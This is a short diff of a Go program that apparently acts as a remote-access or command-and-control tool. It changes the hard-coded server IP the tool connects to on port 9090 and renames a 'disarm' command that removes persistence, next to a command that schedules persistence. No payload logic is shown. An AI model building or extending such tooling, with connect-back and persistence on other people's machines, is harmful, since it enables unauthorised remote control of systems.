@@ -24,10 +24,11 @@ func DisplayError(err error) {
 	if err != nil {
 		fmt.Println(err)
 	}
-}
 
+}
 func main() {
-	ServerIP := "192.168.232.248"
+
+	ServerIP := "192.168.0.201"
 	Port := "9090"
 	connection, err := handleConnection.ConnectWithServer(ServerIP, Port)
 	if err != nil {
@@ -108,7 +109,7 @@ func main() {
 			err = persist.Schedule(connection)
 			DisplayError(err)
 
-		case user_input == "disarm":
+		case user_input == "disarm&exit":
 			fmt.Println("[+] removing persistance")
 			err = persist.Remove(connection)
 			DisplayError(err)
